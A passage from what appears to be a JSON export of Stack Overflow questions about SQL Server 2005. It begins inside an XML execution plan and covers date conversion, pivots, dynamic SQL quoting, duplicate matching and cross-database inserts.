Scalar\" NodeId=\"0\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"0.274954\"&gt;\n              &lt;OutputList&gt;\n                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                &lt;ColumnReference Column=\"Expr1005\" /&gt;\n              &lt;/OutputList&gt;\n              &lt;ComputeScalar&gt;\n                &lt;DefinedValues&gt;\n                  &lt;DefinedValue&gt;\n                    &lt;ColumnReference Column=\"Expr1005\" /&gt;\n                    &lt;ScalarOperator ScalarString=\"isnull([Expr1004],($0.0000))\"&gt;\n                      &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Identifier&gt;\n                            &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                          &lt;/Identifier&gt;\n                        &lt;/ScalarOperator&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/Intrinsic&gt;\n                    &lt;/ScalarOperator&gt;\n                  &lt;/DefinedValue&gt;\n                &lt;/DefinedValues&gt;\n                &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.167304\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"1322.43\" LogicalOp=\"Aggregate\" NodeId=\"1\" Parallel=\"false\" PhysicalOp=\"Hash Match\" EstimatedTotalSubtreeCost=\"0.274822\"&gt;\n                  &lt;OutputList&gt;\n                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                  &lt;/OutputList&gt;\n                  &lt;MemoryFractions Input=\"0\" Output=\"0\" /&gt;\n                  &lt;Hash&gt;\n                    &lt;DefinedValues&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"MIN([directpay].[dbo].[tbl_Faktuur].[Faktuurdatum])\"&gt;\n                          &lt;Aggregate AggType=\"MIN\" Distinct=\"false\"&gt;\n                            &lt;ScalarOperator&gt;\n                              &lt;Identifier&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                              &lt;/Identifier&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/Aggregate&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"SUM([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                          &lt;Aggregate AggType=\"SUM\" Distinct=\"false\"&gt;\n                            &lt;ScalarOperator&gt;\n                              &lt;Identifier&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/Identifier&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/Aggregate&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                    &lt;/DefinedValues&gt;\n                    &lt;HashKeysBuild&gt;\n                      &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;/HashKeysBuild&gt;\n                    &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.030319\" EstimateIO=\"0.0771991\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"27420\" LogicalOp=\"Index Seek\" NodeId=\"2\" Parallel=\"false\" PhysicalOp=\"Index Seek\" EstimatedTotalSubtreeCost=\"0.107518\"&gt;\n                      &lt;OutputList&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                      &lt;/OutputList&gt;\n                      &lt;IndexScan Ordered=\"true\" ScanDirection=\"FORWARD\" ForcedIndex=\"false\" NoExpandHint=\"false\"&gt;\n                        &lt;DefinedValues&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                          &lt;/DefinedValue&gt;\n                        &lt;/DefinedValues&gt;\n                        &lt;Object Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Index=\"[_dta_index_tbl_Faktuur_5_583009158__K13_K9_K19_K2_5]\" /&gt;\n                        &lt;SeekPredicates&gt;\n                          &lt;SeekPredicate&gt;\n                            &lt;Prefix ScanType=\"EQ\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                  &lt;Const ConstValue=\"(0)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/Prefix&gt;\n                            &lt;EndRange ScanType=\"LT\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"($0.0000)\"&gt;\n                                  &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/EndRange&gt;\n                          &lt;/SeekPredicate&gt;\n                          &lt;SeekPredicate&gt;\n                            &lt;Prefix ScanType=\"EQ\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                  &lt;Const ConstValue=\"(0)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/Prefix&gt;\n                            &lt;StartRange ScanType=\"GT\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"($0.0000)\"&gt;\n                                  &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/StartRange&gt;\n                          &lt;/SeekPredicate&gt;\n                        &lt;/SeekPredicates&gt;\n                      &lt;/IndexScan&gt;\n                    &lt;/RelOp&gt;\n                  &lt;/Hash&gt;\n                &lt;/RelOp&gt;\n              &lt;/ComputeScalar&gt;\n            &lt;/RelOp&gt;\n          &lt;/QueryPlan&gt;\n        &lt;/StmtSimple&gt;\n      &lt;/Statements&gt;\n    &lt;/Batch&gt;\n  &lt;/BatchSequence&gt;\n&lt;/ShowPlanXML&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2778,"score":0,"question_id":5483702,"title":"Truncate all tables of a database in SQL Server 2005","body":"<p>How can I truncate all tables of a database?</p>\n"},{"tags":["c#","sql-server-2005","backup"],"answer_count":9,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3369,"score":3,"question_id":841659,"title":"Backup SQL Server Database remotely without backup permission","body":"<p>I have a host which runs SQL Server 2005, I have the ability to login to my database and copy/read/write/drop all tables/views/sp's.  I tried simply right clicking on my server and selecting backup but I don't seem to have permission to do any backing up.  </p>\n\n<p>This cannot be an uncommon occurrence (someone using host/providers db).  </p>\n\n<p>Has anyone figured out how to backup the database to a remote computer (without resorting to plain old copy row by row)?  I'd Like to have my own backup of my server without relying on my host to preform backups.  If so, what library/app allowed you to do this.</p>\n\n<p>Note, I believe that my host does allow for some form of backup using (Database Publishing Wizard) Does anyone know what libraries it uses (so that I may reproduce it in my code)?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13081309,"title":"Converting Date to String in SQL Server 2005","body":"<p>I am working on SQL server 2005. While inserting specified date in the database by this format:<br>\n(<code>10/11/2012 00:00:0:00</code>)(<code>MM/dd/yyyy HH:mm:s:ms</code>).</p>\n\n<pre><code>select CAST(day(column name) AS CHAR(2)) + ' '\n   + CONVERT(CHAR(4), column name, 100) + ', '\n   + CONVERT(CHAR(4), column name, 120) as Coupon_expire\nfrom Admin\n</code></pre>\n\n<p>I can't convert this date to this type (<code>Wednesday, October 11, 2012</code>), please help me.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":90,"score":1,"question_id":13075465,"title":"Is there any alternative of 'like' operators in sql - for searching data","body":"<p>I need some help here, I am fetching data dependent upon the conditions</p>\n\n<p>Here I am using like operators, where client may use search with any word thus I have the below logic but here retrieval time is too high (it's taking 4mins) to get the data which is too slow.</p>\n\n<p>I did all indexing to table but still can't optimize the query.</p>\n\n<p>select * from authors \nwhere (address like '% Walmart %' OR address like 'Walmart %' OR address like '% Walmart' OR address like '% Walmart.com %' OR address like 'Walmart.com %' OR address like '% Walmart.com' OR address like '% Walmarts %' OR address like 'Walmarts %' OR address like '% Walmarts' OR address like '% Walmarts.com %' OR address like 'Walmarts.com %' OR address like '% Walmarts.com') </p>\n\n<p>-- Result is 1 Rows </p>\n\n<p>if i follow this logic</p>\n\n<p>select * from authors \n    where address like '%Walmart%'</p>\n\n<p>-- Result is 44 rows - it is fetching all rows</p>\n\n<p>But I need to get only that one row</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13080866,"title":"Convert DateTime to character string?","body":"<p>I am working on SQL Server 2005. While inserting specified date into the database in this format\n(Wednesday, October 17, 2012), I want to convert that format to this type (<code>MM/dd/yyyy</code>)</p>\n\n<p>Otherwise if I am inserting the date like this format (<code>MM/dd/yyyy</code>), I want to convert that format  to this type (Wednesday, October 17, 2012) or (17 oct,2012).</p>\n\n<p>I can't get the clear idea. if any one knows please help me. </p>\n\n<p>Advance thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":4,"view_count":67,"score":0,"question_id":13069980,"title":"What is the most efficient way to RTRIM a STRING without using RTRIM in SQL Server 2005?","body":"<p>In a single-select-statement, I have the need to <code>RTRIM</code> a string in a SQL Server 2005 environment.</p>\n\n<p>What is, in your opinion, the most efficient technique to achieve this?</p>\n\n<p>Examples:</p>\n\n<pre><code>'ALPHA    ' ==&gt; 'ALPHA' (the blanks at the end are removed)\n' BETA  ' ==&gt; ' BETA'  (the blank in first position remains, the two blanks at the end are removed)\n' GAMMA' ==&gt; ' GAMMA'  (the blank in first position remains)\n</code></pre>\n\n<p>Thank you in advance for your kind help.</p>\n\n<p>EDIT: I am not authorized to use <code>RTRIM</code>!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1939,"score":0,"question_id":390238,"title":"Display a single record (row) as a single column","body":"<p>I'm looking for ways to display a single row of data as a single column (with multiple rows).  For example,</p>\n\n<pre>\nFieldA  FieldB\n------- ---------\n1       Some Text [row]\n\n\nHeader Value [col]\n------ ------\nFieldA 1          [row1]\nFieldB SomeText   [row2]\n\n</pre>\n\n<p>Is there a way to do this with SQL Server 2005?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","duplicates","phonetics"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":13073532,"title":"Please help fix and optimize this query","body":"<p>I am working on a system to find potential duplicates in our customers table (SQL 2005). I am using the built-in SOUNDEX value that our software computes when customers are added/updated, but I also implemented the double metaphone algorithm for better matching. This is the most-nested query I have created, and I can't help but think there is a better way to do it and I'd like to learn.</p>\n\n<p>In the inner-most query I am joining the customer table to the metaphone table I created, then finding customers that have identical pKey (primary phonetic key). I take that, union that with customers that have matching soundex values, and then proceed to score those matches with various text similarity functions.</p>\n\n<p>This is currently working, but I would also like to add a union of customers whose aKey (alternate phonetic key) match. This would be identical to \"QUERY A\" except to substitute <code>on (c1Akey = c2Akey)</code> for the join. However, when I attempt to include that, I get errors when I try to execute my query.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>    --Create aggregate ranking\nselect c1Name, c2Name, nDiff, c1Addr, c2Addr, aDiff, c1SSN, c2SSN, sDiff, c1DOB, c2DOB, dDiff, nDiff+aDiff+dDiff+sDiff as Score\n        ,(sDiff+dDiff)*1.5 + (nDiff+dDiff)*1.5 + (nDiff+sDiff)*1.5 + aDiff *.5 + nDiff *.5 as [Rank]\n    FROM\n    (\n    --Create match scores for different fields\n    SELECT     c1Name, c2Name, c1Addr, c2Addr, c1SSN, c2SSN, c1LTD, \n                      c2LTD, c1DOB, c2DOB, dbo.Jaro(c1name, c2name) AS nDiff, dbo.JaroWinkler(c1addr, c2addr) AS aDiff, \n                      CASE WHEN c1dob = '1901-01-01' OR\n                      c2dob = '1901-01-01' OR\n                      c1dob = '1800-01-01' OR\n                      c2dob = '1800-01-01' THEN .5 ELSE dbo.SmithWaterman(c1dob, c2dob) END AS dDiff, CASE WHEN c1ssn = '000-00-0000' OR\n                      c2ssn = '000-00-0000' THEN .5 ELSE dbo.Jaro(c1ssn, c2ssn) END AS sDiff\nFROM    \n-- Generate list of possible matches based on multiple phonetic matching fields\n( select * from \n    -- List of similar names from pKey field of ##Metaphone table\n    --QUERY A BEGIN\n    (select customers.custno as c1Custno, name as c1Name, haddr as c1Addr, ssn as c1SSN, lasttripdate as c1LTD, dob as c1DOB, soundex as c1Soundex, pkey as c1Pkey, akey as c1Akey from Customers WITH (nolock) join ##Metaphone on customers.custno = ##Metaphone.custno) as c1\n        JOIN\n    (select customers.custno as c2Custno, name as c2Name, haddr as c2Addr, ssn as c2SSN, lasttripdate as c2LTD, dob as c2DOB, soundex as c2Soundex, pkey as c2Pkey, akey as c2Akey from Customers with (nolock) join ##Metaphone on customers.custno = ##Metaphone.custno) as c2\n        on (c1Pkey = c2Pkey) and (c1Custno &lt; c2Custno)\n    WHERE (c1Name &lt;&gt; 'PARENT, GUARDIAN') and c1soundex != c2soundex\n    --QUERY A END\n\n    union\n        --List of similar names from pregenerated SOUNDEX field\n        (select t1.custno, t1.name, t1.haddr, t1.ssn, t1.lasttripdate, t1.dob, t1.[soundex], 0, 0, t2.custno, t2.name, t2.haddr, t2.ssn, t2.lasttripdate, t2.dob, t2.[soundex], 0, 0 from Customers t1 WITH (nolock) \n            join customers t2 with (nolock) on t1.[soundex] = t2.[soundex]  and t1.custno &lt; t2.custno\n                where (t1.name &lt;&gt; 'PARENT, GUARDIAN'))\n\n) as a\n) as b\nwhere (sDiff+dDiff)*1.5 + (nDiff+dDiff)*1.5 + (nDiff+sDiff)*1.5 + aDiff *.5 + nDiff *.5   &gt;= 7.5\norder by [rank] desc, score desc\n</code></pre>\n\n<p>Previously, I was using joins such as <code>on c1.pkey = c2.pkey or c1.akey = c2.akey or c1.soundex = c2.soundex</code> but the performance was horrendous, and using unions seems to be working a lot better. Out of 103K customers, tt is currently generating a list of 8.5M potential matches (based on the phonetic codes) in 2.25 minutes, and then taking another 2 to score, rank and filter those down to about 3000. So I am happy with the performance, I just can't help but think there is a better way to structure this, and I need help adding the extra union condition.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT: I seem to have the additional union working. I must have just had a typo or a parenthesis issue. I struggled with it for over 30 minutes and never got it working. A few hours later I tried another copy/paste and it worked fine. However, with my repeated joins between my customer and ##Metaphone tables (tables c1 and c2), is there a way to join that once and use that result set repeatedly? Could I create it as a temp table and alias it multiple times to find duplicate phonetic matches?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":4274,"score":4,"question_id":1426487,"title":"Format phone number","body":"<p>I have table in the db with phone number column the numbers look like this:</p>\n\n<blockquote>\n  <p>123456789</p>\n</blockquote>\n\n<p>I want to format that to:</p>\n\n<blockquote>\n  <p>123-456-789</p>\n</blockquote>\n\n<p>thanks!!!</p>\n"},{"tags":[".net","vb.net","sql-server-2005","mobile","windows-ce"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13073395,"title":"Windows CE 6.0 Application Error then Application Freezes but works in Windows CE 5","body":"<p>Hello I have a Windows CE Application that works fine in Windows CE 5.0 on MC3090 devices. However we got new Symbol MCs that run Windows CE 6.0 and the application runs but after an exception in the application and the application closes. I get an \"Application Error has occured\". If I try to open the application again it freezes the entire device and I have to reboot it.</p>\n\n<p>The vendor Symbol/Motorola is saying it's not an OS issue but rather a software issue. I am using .NET Framework 3.5. We're using SQL Compact Mobile 3.5 to connect to a remote SQL Server.</p>\n\n<p>Is there anyway I can find out what is causing the \"Application Error\"?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13073105,"title":"Case statement with 'OR' statement","body":"<pre><code>SELECT   ProductNumber, Category =\n      CASE ProductLine\n         WHEN 'R' or 'r' THEN 'Road'\n         WHEN 'M' or 'm' THEN 'Mountain'\n         WHEN 'T' or 't' THEN 'Touring'\n         WHEN 'S' or 's' THEN 'Other sale items'\n         ELSE 'Not for sale'\n</code></pre>\n\n<p>My basic requirement is to use 'OR' with CASE (if possible) , Please suggest if i am doing anything wrong.</p>\n"},{"tags":["mysql","sql-server","sql-server-2005","stored-procedures","udf"],"answer_count":8,"favorite_count":31,"up_vote_count":54,"down_vote_count":0,"view_count":34224,"score":54,"question_id":451415,"title":"Simulating group_concat MySQL function in Microsoft SQL Server 2005?","body":"<p>I'm trying to migrate a MySQL-based app over to Microsoft SQL Server 2005 (not by choice, but that's life).</p>\n\n<p>In the original app, we used <em>almost</em> entirely ANSI-SQL compliant statements, with one significant exception -- we used MySQL's <code>group_concat</code> function fairly frequently.</p>\n\n<p><code>group_concat</code>, by the way, does this: given a table of, say, employee names and projects...</p>\n\n<pre><code>SELECT empName, projID FROM project_members;\n</code></pre>\n\n<p>returns:</p>\n\n<pre><code>ANDY   |  A100\nANDY   |  B391\nANDY   |  X010\nTOM    |  A100\nTOM    |  A510\n</code></pre>\n\n<p>... and here's what you get with group_concat:</p>\n\n<pre><code>SELECT \n    empName, group_concat(projID SEPARATOR ' / ') \nFROM \n    project_members \nGROUP BY \n    empName;\n</code></pre>\n\n<p>returns:</p>\n\n<pre><code>ANDY   |  A100 / B391 / X010\nTOM    |  A100 / A510\n</code></pre>\n\n<p>...So what I'd like to know is: Is it possible to write, say, a user-defined function in SQL Server which emulates the functionality of <code>group_concat</code>? I have almost no experience using UDFs, stored procedures, or anything like that -- just straight-up SQL -- so please err on the side of too much explanation :)</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":11682267,"title":"sql server stored procedure single quotes","body":"<p>I am totally confused with this procedure.please correct my mistakes in quotes.</p>\n\n<pre><code>create procedure queryingsfor \n  @Tabname nvarchar(250),\n  @colname nvarchar(250),\n  @opname nvarchar(290),\n  @valuesname nvarchar(239) \nas\nbegin\n  set NOCOUNT on;\n  declare @sql varchar(4000)\n  set @sql='select * from' +@Tabname+ 'where' +@colname+''''+@opname+''''+ ''''+@valuesname+''''\n  exec(@sql)\nend\nexec queryingsfor 'education','eduCurrentStudy','=','DME'\n</code></pre>\n\n<p>I'm only getting:</p>\n\n<blockquote>\n  <p>Error: Msg 102, Level 15, State 1, Line 1<br>\n  Incorrect syntax near 'fromeducationwhereeduCurrentStudy'.</p>\n</blockquote>\n"},{"tags":["xml","sql-server-2005","xquery"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4793,"score":0,"question_id":577871,"title":"Select records from XML column (SQL Server 2005) based on node order","body":"<p>I have a column in a SQL Server 2005 table defined as an XML column.  Is there a way to select records from this table based on the order of two nodes in that column?  For example, we have the following structure in our XML:</p>\n\n<pre><code>&lt;item&gt;\n   &lt;latitude/&gt;\n   &lt;longitude/&gt;\n&lt;/item&gt;\n</code></pre>\n\n<p>I want to see if there are any records that have latitude/longitude in the opposite order i.e. <code>&lt;longitude/&gt;</code> then <code>&lt;latitude/&gt;</code>.  I've tried some XPath expressions but with no luck.</p>\n"},{"tags":["sql","query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13064040,"title":"Pivot table in sql server 2005","body":"<p>This is my record in my table </p>\n\n<pre><code>GuestName      F1    H1    F2  H2  F3   H3\nRyan Palma     1200  Room  12  SC  14   VAT\nRichard Palma  1500  Room  15  SC  17   VAT\nRuth Palma     1600  Room  16  SV  18   VAT\n</code></pre>\n\n<p>I want an output like this</p>\n\n<pre><code>GuestName      Room  SC  VAT\nRyan Palma     1200  12  14\nRichard Palma  1500  15  17\nRuth Palma     1600  16  18\n</code></pre>\n\n<p>How can i do this using query,</p>\n\n<p>Thanks in advance, any help is appreciated</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13064362,"title":"SQL Server INSERT … SELECT Statement won't parse","body":"<p>I get the following error message with SQL Server 2005</p>\n\n<blockquote>\n  <p><em>Msg 120, Level 15, State 1, Procedure EPIN, Line 37</em><br>\n  <em>The select list for the INSERT statement contains fewer items than the insert list. The  number of SELECT values must match the\n  number of INSERT columns.</em></p>\n</blockquote>\n\n<p>I have copy and pasted the select list and insert list into excel and verified there are the same number of items in each list. Both tables an additional primary key field with is not listed in either the insert statement or select list. I am not sure if that is relevant, but suspicious it may be. </p>\n\n<p>Here is the source for my stored procedure:</p>\n\n<pre><code> set ANSI_NULLS ON\n set QUOTED_IDENTIFIER ON\n go\n\n -- =============================================\n -- Author:     Kristian Manuel\n -- Create date: 10/3/2012\n -- Description:    \n -- =============================================\n ALTER PROCEDURE [dbo].[EPIN] \n-- Add the parameters for the stored procedure here\n     @PLUCODE varchar(30),      --Table tblPolicy\n     @ECPAYFEES numeric(18,2),\n     @COSTPAYABLE numeric(18,2),\n     @RETAILPRICE numeric(18,2),\n     @DENOMINATION varchar(50),\n     @CARDNAME varchar(50),\n     @DistributorID varchar(8),\n     @AccntID decimal(18,0)\n\n --PO1  \n AS\n BEGIN\n     -- SET NOCOUNT ON added to prevent extra result sets from\n     -- interfering with SELECT statements.\n     SET NOCOUNT ON;\n\n     INSERT INTO [ECPAY-PC].[GENESIS].[dbo].[tblPolicy]\n     ( \n       PolicyID                 ,\n       AccountTID               ,\n       DistributorID            ,\n       CARDNAME                 ,\n       DENOMINATION             ,\n       RETAILPRICE              ,\n       COSTPAYABLE              ,\n       ECPAYFEES                ,\n       PLUCODE \n     ) \n     SELECT \n         t.* \n     FROM\n        (SELECT \n            AccountTID = @AccntID, \n            DistributorID = @DistributorID, \n            CARDNAME = @CARDNAME,      \n            DENOMINATION = @DENOMINATION, \n            RETAILPRICE = @RETAILPRICE, \n            COSTPAYABLE = @COSTPAYABLE,      \n            ECPAYFEES = @ECPAYFEES, \n            PLUCODE = @PLUCODE) t,\n        [ECPAY-PC].[ECPNWEB].[dbo].[account] a\n     WHERE\n        a.AccntID = t.AccountTID --for account\n END\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13063139,"title":"SQL Server two lines in one","body":"<p>Hello and thanks for your attention</p>\n\n<p>I need to convert data from two different lines into one line. </p>\n\n<p>Let s imagine </p>\n\n<p><code>ORDERS</code> table:</p>\n\n<pre><code>ID    Name    adress   \n-------------------- \n01    AA      adr1\n02    BB      adr2\n03    CC      adr3\n</code></pre>\n\n<p><code>LINEORDERS</code> table:</p>\n\n<pre><code>ID    IDorder    IDprofileType     ProfileType      idPers   \n------------------------------------------------------------- \n01    01         01                Organizer        0045\n01    01         02                Present          0085\n01    01         02                Present          0032\n01    01         03                Manager          0018\n</code></pre>\n\n<p>Lets imagine we want as result ></p>\n\n<p>Desired result:</p>\n\n<pre><code>IDorder   NameOrder     OrganizerID           PresentID           ManagerID       Diff\n------------------------------------------------------------- \n01        AA            0045                  0085                0018            yes\n01        AA            0045                  0032                0018            yes\n</code></pre>\n\n<p><code>Diff</code> is yes if <code>managerID</code> and <code>organizerID</code> are different.</p>\n\n<p>How can I get such a result?</p>\n\n<p>Do I need to create  T-SQL temporary tables? What would be the lighter?</p>\n\n<p>I have a lot of lines in the table.</p>\n\n<p>Thanks for your help</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13050203,"title":"find several texts in sql column","body":"<p>I have a column that contains html details in it and within each column, the html contains different http links. I need to find out all the http links in each column.</p>\n\n<p>e.g.: column 1 Row 1</p>\n\n<pre><code>html \n... \na href = http://www.column1.com....... \nimg src=http://www.pic1.com/images/im.jpg...\n...\n/html\n</code></pre>\n\n<p>column 1 Row 2 </p>\n\n<pre><code>html \n...\na href = http://www.column2.com.......  \nimg src=\"http://www.pic2.com/images/im.jpg\".... \n/html\n</code></pre>\n\n<p>in the result I need to get the following list :</p>\n\n<ul>\n<li>link1 in first column1 in href\ndomain in the first column img link</li>\n<li>link2 in second column2 in href\ndomain in the second column img2 link</li>\n</ul>\n\n<p>Could anyone help me to find this as i don't have a clue at all what to do and I'm not good using sql.</p>\n"},{"tags":["sql","database","sql-server-2005","table","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13060307,"title":"How to retrieve the records of the table from database to another database","body":"<p>I have two tables with different database</p>\n\n<p>-AccntID from table 'account' &lt;--database name 'ECPNWEB'\n-AccountTID from table 'tblPolicy' &lt;--database name 'GENESIS'</p>\n\n<p>Now I want to insert 'tblPolicy' like this: &lt;--database 'GENESIS'</p>\n\n<pre><code>  INSERT INTO dbo.tblPolicy\n      ( \n\n        PolicyID                 ,\n        AccountTID               ,\n        DistributorID            ,\n        CARDNAME                 ,\n        DENOMINATION             ,\n        RETAILPRICE              ,\n        COSTPAYABLE              ,\n        ECPAYFEES                ,\n        PLUCODE \n\n      ) \n-- Insert statements for procedure here\n\n\nselect t.* from\n(Select  AccountTID=@AccntID, DistributorID=@DistributorID, CARDNAME=@CARDNAME, DENOMINATION=@DENOMINATION, RETAILPRICE=@RETAILPRICE, COSTPAYABLE=@COSTPAYABLE, ECPAYFEES=@ECPAYFEES, PLUCODE=@PLUCODE) t,\naccount a\nwhere a.AccntID = t.AccountTID --for account\n</code></pre>\n\n<p>Now what I want to do is to insert this \"ONLY\" to tblPolicy connected with the 'account' table with different database 'GENESIS'</p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["sql-server-2005","table","insert-into"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13057383,"title":"How to add a row number to new table in SQL?","body":"<p>I'm trying to create a new table using an existing table already using:</p>\n\n<pre><code>INSERT INTO NewTable (...,...)\n   SELECT * from SampleTable\n</code></pre>\n\n<p>What I need to is add a record number at the beginning or the end, it really doesn't matter as long as it's there.</p>\n\n<p><strong>Sample Table</strong></p>\n\n<pre><code>Elizabeth  RI 02914\nEmily      MA 01834\n</code></pre>\n\n<p><strong>Prospective New Table</strong></p>\n\n<pre><code>1 Elizabeth  RI 02914\n2 Emily      MA 